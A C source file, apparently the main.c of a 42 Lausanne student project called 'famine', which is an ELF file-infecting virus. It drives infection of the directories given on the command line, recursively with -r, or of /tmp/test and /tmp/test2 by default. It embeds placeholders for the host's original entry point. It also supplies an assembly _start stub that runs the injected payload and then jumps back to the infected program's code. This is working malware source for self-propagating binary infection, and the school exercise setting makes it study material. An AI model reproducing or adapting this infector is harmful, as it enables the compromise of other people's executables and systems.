/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: cbopp <cbopp@student.42lausanne.ch>        +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/03/25 13:23:26 by cbopp             #+#    #+#             */
/*   Updated: 2026/05/14 12:04:59 by ilyanar          ###   LAUSANNE.ch       */
/*                                                                            */
/* ************************************************************************** */

#include "../include/famine.h"

__attribute__((section(".rodata.placeholders")))
// __attribute__((retain)) // NOTE: needs (GCC 11 and binutils 2.36) or (Clang 13 and (binutils 2.36 or ld.lld 13))
struct placeholders volatile placeholders = { // NOTE: volatile makes sure the variables are taken from here, their values are not inlined
	.entry = 0x1111111111111111,
	.phdr = 0,
	.stub_len = 0,
};

#if NOSTD
void _start();
#endif

#if CREATE_STUB

int main(void) {
	size_t offset = (uintptr_t)&placeholders - (uintptr_t)&_start;
	infect_dir("/tmp/test", (void*)&_start, placeholders.stub_len, offset, 0);
	infect_dir("/tmp/test2", (void*)&_start, placeholders.stub_len, offset, 0);
	LOG("done\n");
	LOG("placeholder offset: %zu\n", offset);
	return (0);
}

#else

static void infect_target(const char *path, const unsigned char *stub,
	size_t stub_len, size_t offset, bool recursive)
{
	struct stat st;

	if (stat(path, &st) == -1)
	{
		LOG("Cannot stat %s\n", path);
		return ;
	}
	if (S_ISDIR(st.st_mode))
		infect_dir(path, stub, stub_len, offset, recursive);
	else if (S_ISREG(st.st_mode))
		infect_file(path, stub, stub_len, offset);
}

int main(int argc, char **argv) {
	bool recursive = false;
	bool has_targets = false;

	for (int i = 1; i < argc; i++)
	{
		if (strcmp(argv[i], "-r") == 0)
			recursive = true;
		else if (strcmp(argv[i], "--help") == 0)
		{
			LOG("Usage: %s [-r] [targets...]\n", argv[0]);
			return (0);
		}
		else
			has_targets = true;
	}
	void *site = memmem(stub_bin, stub_bin_len, (void*)&placeholders.entry, sizeof(placeholders.entry));
	if (site == NULL) {
		LOG("Placeholders not found\n");
		return (1);
	}
	size_t offset = (uintptr_t)site - (uintptr_t)stub_bin - offsetof(struct placeholders, entry);
	if (has_targets)
	{
		for (int i = 1; i < argc; i++)
		{
			if (argv[i][0] == '-')
				continue ;
			infect_target(argv[i], stub_bin, stub_bin_len, offset, recursive);
		}
	}
	else
	{
		infect_dir("/tmp/test", stub_bin, stub_bin_len, offset, recursive);
		infect_dir("/tmp/test2", stub_bin, stub_bin_len, offset, recursive);
	}
	LOG("done\n");
	return (0);
}

#endif // CREATE_STUB

#if CREATE_STUB
#if NOSTD
#else
#error Creating a stub requires NOSTD
#endif
#endif

#if NOSTD

__attribute__((used))
size_t my_start(size_t *rsp, size_t *load_base_ptr) {
	size_t argc = rsp[0];
	char **argv = (char**)&rsp[1];
	char **envp = &argv[argc + 1];
	size_t envp_len = 0;
	while (envp[envp_len] != NULL) {
		envp_len++;
	}
	size_t *auxv = (size_t*)&envp[envp_len + 1];

	main();
	// my_main(argc, argv, envp, auxv);
	// sys_exit(my_main(argc, argv, envp, auxv));
	// __builtin_unreachable();

	size_t load_base = 0;
	for (size_t i = 0; auxv[i] != AT_NULL; i += 2) {
		if (auxv[i] == AT_PHDR) {
			load_base = auxv[i + 1] - placeholders.phdr;
			break;
		}
	}
	*load_base_ptr = load_base;

	// sys_exit(0);
	return load_base + placeholders.entry;
}

#if CREATE_STUB

__attribute__((section("._start")))
__attribute__((naked))
void _start() {
	// callee-saved RBX, RSP, RBP, and R12–R15
	asm volatile(
		"movq %%rdx, %%rbx\n" // save rtld_fini
		"movq %%rsp, %%rdi\n" // pass address of rsp to my_start
		"subq $8, %%rsp\n" // reserve space for load_base
		"movq %%rsp, %%rsi\n" // pass address to load_base
		"call my_start\n"
		"popq %%rbp\n" // rbp = load_base
		"movq %%rbx, %%rdx\n" // restore rtld_fini
		"jmpq *%%rax\n"
		:
	);
}

#else
#error just use libc if youre not going to create a stub
#endif // CREATE_STUB
#endif // NOST
